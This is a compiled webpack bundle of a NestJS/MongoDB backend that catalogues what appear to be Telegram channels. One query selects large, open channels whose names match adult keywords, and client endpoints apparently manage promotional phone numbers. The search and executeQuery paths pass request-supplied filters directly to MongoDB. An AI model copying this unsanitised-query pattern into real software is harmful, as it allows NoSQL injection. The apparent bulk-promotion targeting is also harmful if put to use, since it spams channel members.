const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Build = class Build {
};
exports.Build = Build;
exports.Build = Build = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], Build);
exports.BuildSchema = mongoose_1.SchemaFactory.createForClass(Build);
exports.BuildSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/channels/channels.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/channels/channels.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_channel_dto_1 = __webpack_require__(/*! ./dto/search-channel.dto */ "./src/components/channels/dto/search-channel.dto.ts");
const create_channel_dto_1 = __webpack_require__(/*! ./dto/create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
const update_channel_dto_1 = __webpack_require__(/*! ./dto/update-channel.dto */ "./src/components/channels/dto/update-channel.dto.ts");
let ChannelsController = class ChannelsController {
    constructor(channelsService) {
        this.channelsService = channelsService;
    }
    async create(createChannelDto) {
        return this.channelsService.create(createChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.channelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        console.log(query);
        return this.channelsService.search(query);
    }
    async findAll() {
        return this.channelsService.findAll();
    }
    async findOne(channelId) {
        return this.channelsService.findOne(channelId);
    }
    async update(channelId, updateChannelDto) {
        return this.channelsService.update(channelId, updateChannelDto);
    }
    async remove(channelId) {
        return this.channelsService.remove(channelId);
    }
};
exports.ChannelsController = ChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new  channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_channel_dto_1.CreateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_channel_dto_1.CreateChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_channel_dto_1.SearchChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "search", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all  channels' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Update an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_channel_dto_1.UpdateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':channelId'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete an  channel by channelId' }),
    __param(0, (0, common_1.Param)('channelId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "remove", null);
exports.ChannelsController = ChannelsController = __decorate([
    (0, swagger_1.ApiTags)('Channels'),
    (0, common_1.Controller)('channels'),
    __metadata("design:paramtypes", [channels_service_1.ChannelsService])
], ChannelsController);


/***/ }),

/***/ "./src/components/channels/channels.module.ts":
/*!****************************************************!*\
  !*** ./src/components/channels/channels.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const channels_controller_1 = __webpack_require__(/*! ./channels.controller */ "./src/components/channels/channels.controller.ts");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let ChannelsModule = class ChannelsModule {
};
exports.ChannelsModule = ChannelsModule;
exports.ChannelsModule = ChannelsModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.initModule,
            mongoose_1.MongooseModule.forFeature([{ name: channel_schema_1.Channel.name, schema: channel_schema_1.ChannelSchema }]),
        ],
        controllers: [channels_controller_1.ChannelsController],
        providers: [channels_service_1.ChannelsService],
        exports: [channels_service_1.ChannelsService]
    })
], ChannelsModule);


/***/ }),

/***/ "./src/components/channels/channels.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/channels/channels.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const channel_schema_1 = __webpack_require__(/*! ./schemas/channel.schema */ "./src/components/channels/schemas/channel.schema.ts");
let ChannelsService = class ChannelsService {
    constructor(ChannelModel) {
        this.ChannelModel = ChannelModel;
        console.log(channel_schema_1.Channel.name);
    }
    async create(createChannelDto) {
        const createdChannel = new this.ChannelModel(createChannelDto);
        return createdChannel.save();
    }
    async createMultiple(createChannelDtos) {
        const bulkOps = createChannelDtos.map((dto) => ({
            updateOne: {
                filter: { channelId: dto.channelId },
                update: { $set: dto },
                upsert: true
            }
        }));
        await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });
        return 'Channels Saved';
    }
    async findAll() {
        return this.ChannelModel.find().exec();
    }
    async findOne(channelId) {
        const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();
        return channel;
    }
    async update(channelId, updateChannelDto) {
        const updatedChannel = await this.ChannelModel.findOneAndUpdate({ channelId }, { $set: updateChannelDto }, { new: true, upsert: true }).exec();
        return updatedChannel;
    }
    async remove(channelId) {
        const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();
    }
    async search(filter) {
        console.log(filter);
        return this.ChannelModel.find(filter).exec();
    }
    async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {
        const pattern = new RegExp(keywords.join('|'), 'i');
        const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', "i");
        let query = {
            $and: [
                { username: { $ne: null } },
                {
                    $or: [
                        { title: { $regex: pattern } },
                        { username: { $regex: pattern } }
                    ]
                },
                {
                    username: {
                        $not: {
                            $regex: "^(" + notIds.map(id => "(?i)" + id?.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))?.join("|") + ")$"
                        }
                    }
                },
                {
                    title: { $not: { $regex: notPattern } }
                },
                {
                    username: { $not: { $regex: notPattern } }
                },
                {
                    sendMessages: false,
                    broadcast: false,
                    restricted: false
                }
            ]
        };
        const sort = { participantsCount: "desc" };
        try {
            const result = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
    async executeQuery(query, sort, limit) {
        try {
            if (!query) {
                throw new common_1.BadRequestException('Query is invalid.');
            }
            const queryExec = this.ChannelModel.find(query);
            if (sort) {
                queryExec.sort(sort);
            }
            if (limit) {
                queryExec.limit(limit);
            }
            return await queryExec.exec();
        }
        catch (error) {
            throw new common_1.InternalServerErrorException(error.message);
        }
    }
    async getActiveChannels(limit = 50, skip = 0, notIds = []) {
        const query = {
            '$and': [
                {
                    '$or': [
                        { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                        { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },
                    ]
                },
                {
                    '$or': [
                        { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                        { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },
                    ]
                },
                {
                    channelId: { '$nin': notIds },
                    participantsCount: { $gt: 1000 },
                    username: { $ne: null },
                    canSendMsgs: true,
                    restricted: false,
                    forbidden: false
                }
            ]
        };
        const sort = notIds.length > 300 && false ? 0 : { participantsCount: -1 };
        try {
            const result = await this.ChannelModel.aggregate([
                { $match: query },
                { $skip: skip },
                { $limit: limit },
                { $addFields: { randomField: { $rand: {} } } },
                { $sort: sort },
                { $project: { randomField: 0 } }
            ]).exec();
            return result;
        }
        catch (error) {
            console.error('Error:', error);
            return [];
        }
    }
};
exports.ChannelsService = ChannelsService;
exports.ChannelsService = ChannelsService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(channel_schema_1.Channel.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], ChannelsService);


/***/ }),

/***/ "./src/components/channels/dto/create-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/create-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateChannelDto {
    constructor() {
        this.private = false;
        this.forbidden = false;
    }
}
exports.CreateChannelDto = CreateChannelDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a broadcast channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "broadcast", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is a megagroup',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "megagroup", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Number of participants in the channel',
        example: 0,
    }),
    __metadata("design:type", Number)
], CreateChannelDto.prototype, "participantsCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is restricted',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "restricted", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel can send messages',
        example: null,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "sendMessages", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Username of the channel',
        example: null,
        required: false,
    }),
    __metadata("design:type", String)
], CreateChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Whether the channel is private',
        example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        default: false, example: false,
        required: false,
    }),
    __metadata("design:type", Boolean)
], CreateChannelDto.prototype, "forbidden", void 0);


/***/ }),

/***/ "./src/components/channels/dto/search-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/search-channel.dto.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class SearchChannelDto {
}
exports.SearchChannelDto = SearchChannelDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Unique identifier for the channel',
        example: '803387987',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "channelId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Title of the channel',
        example: 'Earn money with Ayesha',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "title", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'privacy of the channel',
        example: false,
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "private", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Username of the channel',
        example: 'ayesha_channel',
    }),
    __metadata("design:type", String)
], SearchChannelDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Indicates if the channel can send messages',
        example: true,
    }),
    __metadata("design:type", Boolean)
], SearchChannelDto.prototype, "canSendMsgs", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Minimum number of participants in the channel',
        example: 10,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "minParticipantsCount", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({
        description: 'Maximum number of participants in the channel',
        example: 100,
    }),
    __metadata("design:type", Number)
], SearchChannelDto.prototype, "maxParticipantsCount", void 0);


/***/ }),

/***/ "./src/components/channels/dto/update-channel.dto.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/dto/update-channel.dto.ts ***!
  \***********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateChannelDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_channel_dto_1 = __webpack_require__(/*! ./create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
class UpdateChannelDto extends (0, swagger_1.PartialType)(create_channel_dto_1.CreateChannelDto) {
}
exports.UpdateChannelDto = UpdateChannelDto;


/***/ }),

/***/ "./src/components/channels/schemas/channel.schema.ts":
/*!***********************************************************!*\
  !*** ./src/components/channels/schemas/channel.schema.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelSchema = exports.Channel = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
let Channel = class Channel {
};
exports.Channel = Channel;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], Channel.prototype, "channelId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "broadcast", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: true }),
    __metadata("design:type", Boolean)
], Channel.prototype, "canSendMsgs", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose.Schema.Types.Number, default: 0 }),
    __metadata("design:type", Number)
], Channel.prototype, "participantsCount", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "restricted", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "sendMessages", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Channel.prototype, "title", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: null }),
    __metadata("design:type", String)
], Channel.prototype, "username", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, default: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "private", void 0);
__decorate([
    (0, mongoose_1.Prop)({ default: false, required: false }),
    __metadata("design:type", Boolean)
], Channel.prototype, "forbidden", void 0);
exports.Channel = Channel = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Channel);
exports.ChannelSchema = mongoose_1.SchemaFactory.createForClass(Channel);


/***/ }),

/***/ "./src/components/clients/client.controller.ts":
/*!*****************************************************!*\
  !*** ./src/components/clients/client.controller.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ClientController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const client_service_1 = __webpack_require__(/*! ./client.service */ "./src/components/clients/client.service.ts");
const create_client_dto_1 = __webpack_require__(/*! ./dto/create-client.dto */ "./src/components/clients/dto/create-client.dto.ts");
const search_client_dto_1 = __webpack_require__(/*! ./dto/search-client.dto */ "./src/components/clients/dto/search-client.dto.ts");
const update_client_dto_1 = __webpack_require__(/*! ./dto/update-client.dto */ "./src/components/clients/dto/update-client.dto.ts");
let ClientController = class ClientController {
    constructor(clientService) {
        this.clientService = clientService;
    }
    async create(createClientDto) {
        try {
            return await this.clientService.create(createClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async search(query) {
        try {
            return await this.clientService.search(query);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async updateClient(clientId) {
        return this.clientService.updateClient(clientId);
    }
    async findAllMasked(query) {
        try {
            return await this.clientService.findAllMasked(query);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findAll() {
        try {
            return await this.clientService.findAll();
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
    async findOne(clientId) {
        try {
            return await this.clientService.findOne(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async update(clientId, updateClientDto) {
        try {
            return await this.clientService.update(clientId, updateClientDto);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async remove(clientId) {
        try {
            return await this.clientService.remove(clientId);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async executeQuery(requestBody) {
        const { query, sort, limit, skip } = requestBody;
        try {
            return await this.clientService.executeQuery(query, sort, limit, skip);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.BAD_REQUEST);
        }
    }
    async addPromoteMobile(clientId, mobileNumber) {
        try {
            return await this.clientService.addPromoteMobile(clientId, mobileNumber);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
    async removePromoteMobile(clientId, mobileNumber) {
        try {
            return await this.clientService.removePromoteMobile(clientId, mobileNumber);
        }
        catch (error) {
            throw new common_1.HttpException(error.message, common_1.HttpStatus.NOT_FOUND);
        }
    }
};
exports.ClientController = ClientController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create user data' }),
    (0, swagger_1.ApiResponse)({ status: 201, description: 'The user data has been successfully created.' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Invalid input data.' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_client_dto_1.CreateClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "create", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search user data' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Matching user data returned successfully.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "search", null);
__decorate([
    (0, common_1.Get)('updateClient/:clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    __param(0, (0, common_1.Param)('clientId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "updateClient", null);
__decorate([
    (0, common_1.Get)('maskedCls'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data with masked fields' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __param(0, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [search_client_dto_1.SearchClientDto]),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAllMasked", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all user data' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'All user data returned successfully.' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], ClientController.prototype, "findAll", null);
__decorate([
    (0, common_1.Get)(':clientId'),
    (0, swagger_1.ApiOperation)({ summary: 'Get user data by ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'User data returned successfully.' }),
